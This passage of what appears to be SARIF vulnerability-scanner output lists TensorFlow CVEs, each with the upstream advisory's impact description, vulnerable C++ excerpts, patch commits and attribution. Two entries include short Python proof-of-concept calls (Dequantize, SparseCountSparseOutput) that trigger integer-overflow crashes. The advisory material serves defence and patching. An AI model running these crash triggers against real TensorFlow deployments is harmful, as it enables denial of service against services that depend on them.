              "id": "CVE-2022-21727",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21727"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21727",
              "help": {
                "text": "Vulnerability CVE-2022-21727\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21727](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21727)\n### Impact \nThe [implementation of shape inference for `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034) is vulnerable to an integer overflow weakness:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([1,1],dtype=tf.qint32)\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=input,\n    min_range=[1.0],\n    max_range=[10.0],\n    mode=`MIN_COMBINED`,\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n``` \n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes `axis + 1`, an attacker can trigger an integer overflow:\n\n```cc\n  int axis = -1; \n  Status s = c-\u003eGetAttr(\"axis\", \u0026axis);\n  // ...\n  if (axis \u003c -1) {\n    return errors::InvalidArgument(\"axis should be at least -1, got \",\n                                   axis);\n  }\n  // ...\n  if (axis != -1) {\n    ShapeHandle input;\n    TF_RETURN_IF_ERROR(c-\u003eWithRankAtLeast(c-\u003einput(0), axis + 1, \u0026input));\n    // ...\n  }\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [b64638ec5ccaa77b7c1eb90958e3d85ce381f91b](https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21727**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21727](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21727)|\n\n### Impact \nThe [implementation of shape inference for `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034) is vulnerable to an integer overflow weakness:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([1,1],dtype=tf.qint32)\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=input,\n    min_range=[1.0],\n    max_range=[10.0],\n    mode=`MIN_COMBINED`,\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n``` \n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes `axis + 1`, an attacker can trigger an integer overflow:\n\n```cc\n  int axis = -1; \n  Status s = c-\u003eGetAttr(\"axis\", \u0026axis);\n  // ...\n  if (axis \u003c -1) {\n    return errors::InvalidArgument(\"axis should be at least -1, got \",\n                                   axis);\n  }\n  // ...\n  if (axis != -1) {\n    ShapeHandle input;\n    TF_RETURN_IF_ERROR(c-\u003eWithRankAtLeast(c-\u003einput(0), axis + 1, \u0026input));\n    // ...\n  }\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [b64638ec5ccaa77b7c1eb90958e3d85ce381f91b](https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23584",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23584"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23584",
              "help": {
                "text": "Vulnerability CVE-2022-23584\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23584)\n### Impact\nA malicious user can cause a use after free behavior when [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L339-L346):\n```cc\nif (/* ... error conditions ... */) {\n  png::CommonFreeDecode(\u0026decode);\n  OP_REQUIRES(context, false,\n              errors::InvalidArgument(\"PNG size too large for int: \",\n                                      decode.width, \" by \", decode.height));\n}   \n```\nAfter `png::CommonFreeDecode(\u0026decode)` gets called, the values of `decode.width` and `decode.height` are in an unspecified state.\n\n### Patches\nWe have patched the issue in GitHub commit [e746adbfcfee15e9cfdb391ff746c765b99bdf9b](https://github.com/tensorflow/tensorflow/commit/e746adbfcfee15e9cfdb391ff746c765b99bdf9b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23584**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23584)|\n\n### Impact\nA malicious user can cause a use after free behavior when [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L339-L346):\n```cc\nif (/* ... error conditions ... */) {\n  png::CommonFreeDecode(\u0026decode);\n  OP_REQUIRES(context, false,\n              errors::InvalidArgument(\"PNG size too large for int: \",\n                                      decode.width, \" by \", decode.height));\n}   \n```\nAfter `png::CommonFreeDecode(\u0026decode)` gets called, the values of `decode.width` and `decode.height` are in an unspecified state.\n\n### Patches\nWe have patched the issue in GitHub commit [e746adbfcfee15e9cfdb391ff746c765b99bdf9b](https://github.com/tensorflow/tensorflow/commit/e746adbfcfee15e9cfdb391ff746c765b99bdf9b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23574",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23574"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23574",
              "help": {
                "text": "Vulnerability CVE-2022-23574\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23574)\n### Impact\nThere is a typo in TensorFlow`s [`SpecializeType`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L81-L102) which results in heap OOB read/write:\n\n```cc\nfor (int i = 0; i \u003c op_def.output_arg_size(); i++) {\n  // ...\n  for (int j = 0; j \u003c t-\u003eargs_size(); j++) {\n    auto* arg = t-\u003emutable_args(i);\n    // ...\n  }\n} \n```\n\nDue to a typo, `arg` is initialized to the `i`th mutable argument in a loop where the loop index is `j`. Hence it is possible to assign to `arg` from outside the vector of arguments. Since this is a mutable proto value, it allows both read and write to outside of bounds data.\n\n### Patches\nWe have patched the issue in GitHub commit [0657c83d08845cc434175934c642299de2c0f042](https://github.com/tensorflow/tensorflow/commit/0657c83d08845cc434175934c642299de2c0f042).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23574**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23574)|\n\n### Impact\nThere is a typo in TensorFlow`s [`SpecializeType`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L81-L102) which results in heap OOB read/write:\n\n```cc\nfor (int i = 0; i \u003c op_def.output_arg_size(); i++) {\n  // ...\n  for (int j = 0; j \u003c t-\u003eargs_size(); j++) {\n    auto* arg = t-\u003emutable_args(i);\n    // ...\n  }\n} \n```\n\nDue to a typo, `arg` is initialized to the `i`th mutable argument in a loop where the loop index is `j`. Hence it is possible to assign to `arg` from outside the vector of arguments. Since this is a mutable proto value, it allows both read and write to outside of bounds data.\n\n### Patches\nWe have patched the issue in GitHub commit [0657c83d08845cc434175934c642299de2c0f042](https://github.com/tensorflow/tensorflow/commit/0657c83d08845cc434175934c642299de2c0f042).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23569",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23569"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23569",
              "help": {
                "text": "Vulnerability CVE-2022-23569\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23569)\n### Impact \nMultiple operations in TensorFlow can be used to trigger a denial of service via `CHECK`-fails (i.e., assertion failures). This is similar to [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and has similar fixes.\n\n### Patches\nWe have patched the reported issues in multiple GitHub commits. It is possible that other similar instances exist in TensorFlow, we will issue fixes as these are discovered.\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-23569**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23569)|\n\n### Impact \nMultiple operations in TensorFlow can be used to trigger a denial of service via `CHECK`-fails (i.e., assertion failures). This is similar to [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and has similar fixes.\n\n### Patches\nWe have patched the reported issues in multiple GitHub commits. It is possible that other similar instances exist in TensorFlow, we will issue fixes as these are discovered.\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23571",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23571"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23571",
              "help": {
                "text": "Vulnerability CVE-2022-23571\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23571)\n### Impact\nWhen decoding a tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments, if the tensors have an invalid `dtype` and 0 elements or an invalid shape. This allows attackers to cause denial of services in TensorFlow processes.\n\n### Patches\nWe have patched the issue in GitHub commit [5b491cd5e41ad63735161cec9c2a568172c8b6a3](https://github.com/tensorflow/tensorflow/commit/5b491cd5e41ad63735161cec9c2a568172c8b6a3).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range. \n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23571**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23571)|\n\n### Impact\nWhen decoding a tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments, if the tensors have an invalid `dtype` and 0 elements or an invalid shape. This allows attackers to cause denial of services in TensorFlow processes.\n\n### Patches\nWe have patched the issue in GitHub commit [5b491cd5e41ad63735161cec9c2a568172c8b6a3](https://github.com/tensorflow/tensorflow/commit/5b491cd5e41ad63735161cec9c2a568172c8b6a3).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range. \n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23576",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23576"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23576",
              "help": {
                "text": "Vulnerability CVE-2022-23576\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23576](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23576)\n### Impact\nThe [implementation of `OpLevelCostEstimator::CalculateOutputSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1598-L1617) is vulnerable to an integer overflow if an attacker can create an operation which would involve tensors with large enough number of elements:\n```cc\nfor (const auto\u0026 dim : output_shape.dim()) {\n  output_size *= dim.size();\n} \n```\n  \nHere, we can have a large enough number of dimensions in `output_shape.dim()` or just a small number of dimensions being large enough to cause an overflow in the multiplication.\n\n### Patches\nWe have patched the issue in GitHub commit [b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae](https://github.com/tensorflow/tensorflow/commit/b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-23576**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23576](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23576)|\n\n### Impact\nThe [implementation of `OpLevelCostEstimator::CalculateOutputSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L1598-L1617) is vulnerable to an integer overflow if an attacker can create an operation which would involve tensors with large enough number of elements:\n```cc\nfor (const auto\u0026 dim : output_shape.dim()) {\n  output_size *= dim.size();\n} \n```\n  \nHere, we can have a large enough number of dimensions in `output_shape.dim()` or just a small number of dimensions being large enough to cause an overflow in the multiplication.\n\n### Patches\nWe have patched the issue in GitHub commit [b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae](https://github.com/tensorflow/tensorflow/commit/b9bd6cfd1c50e6807846af9a86f9b83cafc9c8ae).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23588",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23588"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23588",
              "help": {
                "text": "Vulnerability CVE-2022-23588\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23588](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23588)\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [Grappler optimizer would attempt to build a tensor using a reference `dtype`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1328-L1402). This would result in a crash due to a `CHECK`-fail [in the `Tensor` constructor](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/tensor.cc#L733-L781) as reference types are not allowed.\n### Patches\nWe have patched the issue in GitHub commit [6b5adc0877de832b2a7c189532dbbbc64622eeb6](https://github.com/tensorflow/tensorflow/commit/6b5adc0877de832b2a7c189532dbbbc64622eeb6).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23588**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23588](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23588)|\n\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [Grappler optimizer would attempt to build a tensor using a reference `dtype`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1328-L1402). This would result in a crash due to a `CHECK`-fail [in the `Tensor` constructor](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/tensor.cc#L733-L781) as reference types are not allowed.\n### Patches\nWe have patched the issue in GitHub commit [6b5adc0877de832b2a7c189532dbbbc64622eeb6](https://github.com/tensorflow/tensorflow/commit/6b5adc0877de832b2a7c189532dbbbc64622eeb6).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23580",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23580"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23580",
              "help": {
                "text": "Vulnerability CVE-2022-23580\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23580)\n### Impact\nDuring shape inference, TensorFlow can [allocate a large vector](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L788-L790) based on a value from a tensor controlled by the user:\n\n```cc\n  const auto num_dims = Value(shape_dim);\n  std::vector\u003cDimensionHandle\u003e dims;\n  dims.reserve(num_dims);\n``` \n  \n### Patches           \nWe have patched the issue in GitHub commit [1361fb7e29449629e1df94d44e0427ebec8c83c7](https://github.com/tensorflow/tensorflow/commit/1361fb7e29449629e1df94d44e0427ebec8c83c7).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. ",
                "markdown": "**Vulnerability CVE-2022-23580**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23580)|\n\n### Impact\nDuring shape inference, TensorFlow can [allocate a large vector](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L788-L790) based on a value from a tensor controlled by the user:\n\n```cc\n  const auto num_dims = Value(shape_dim);\n  std::vector\u003cDimensionHandle\u003e dims;\n  dims.reserve(num_dims);\n``` \n  \n### Patches           \nWe have patched the issue in GitHub commit [1361fb7e29449629e1df94d44e0427ebec8c83c7](https://github.com/tensorflow/tensorflow/commit/1361fb7e29449629e1df94d44e0427ebec8c83c7).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. "
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-21738",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21738"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21738",
              "help": {
                "text": "Vulnerability CVE-2022-21738\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21738](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21738)\n### Impact \nThe [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n    \ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[1,1]],\n  values=[2],\n  dense_shape=[2 ** 31, 2 ** 32],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6f4d3e8139ec724dbbcb40505891c81dd1052c4a](https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-21738**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21738](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21738)|\n\n### Impact \nThe [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n    \ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[1,1]],\n  values=[2],\n  dense_shape=[2 ** 31, 2 ** 32],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6f4d3e8139ec724dbbcb40505891c81dd1052c4a](https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23579",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23579"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23579",
              "help": {
                "text": "Vulnerability CVE-2022-23579\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23579)\n### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`SafeToRemoveIdentity`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/dependency_optimizer.cc#L59-L98) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commit [92dba16749fae36c246bec3f9ba474d9ddeb7662](https://github.com/tensorflow/tensorflow/commit/92dba16749fae36c246bec3f9ba474d9ddeb7662).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23579**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23579)|\n\n### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`SafeToRemoveIdentity`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/dependency_optimizer.cc#L59-L98) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commit [92dba16749fae36c246bec3f9ba474d9ddeb7662](https://github.com/tensorflow/tensorflow/commit/92dba16749fae36c246bec3f9ba474d9ddeb7662).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
